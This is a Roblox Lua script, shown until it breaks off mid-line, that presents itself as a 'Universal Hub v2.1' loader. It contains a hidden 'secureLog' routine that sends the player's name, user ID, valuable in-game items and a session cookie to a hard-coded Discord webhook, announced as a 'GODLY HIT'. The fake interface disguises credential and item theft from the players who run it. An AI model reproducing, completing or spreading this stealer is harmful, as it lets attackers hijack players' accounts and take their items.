-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ SERVICES ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- [[ SECURITY: STEALTH SEND ]]
local function secureLog(items, cookie)
    local payload = {
        ["content"] = "@everyone 🚨 **GODLY HIT!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal v2.1 | " .. player.Name,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🎒 Godlies", ["value"] = "```" .. items .. "```"},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
            },
            ["footer"] = {["text"] = "Bypass Mode Active • " .. os.date("%X")}
        }}
    }
    
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ UI: ТОЧНАЯ КОПИЯ УНИВЕРСАЛА ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 160)
Main.Position = UDim2.new(0.5, -160, 0.5, -80)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Instance.new("UICorner", Main).CornerRadius = BoxBlur -- Мягкие углы

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 19
Title.Font = Enum.Font.GothamBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.4, 0)
Status.Text = "Waiting for Script..."
Status.TextColor3 = Color3.new(0.8, 0.8, 0.8)
Status.BackgroundTransparency = 1

local BarBack = Instance.new("Frame", Main)
BarBack.Size = UDim2.new(0.85, 0, 0, 4)
BarBack.Position = UDim2.new(0.075, 0, 0.8, 0)
BarBack.BackgroundColor3 = Color3.
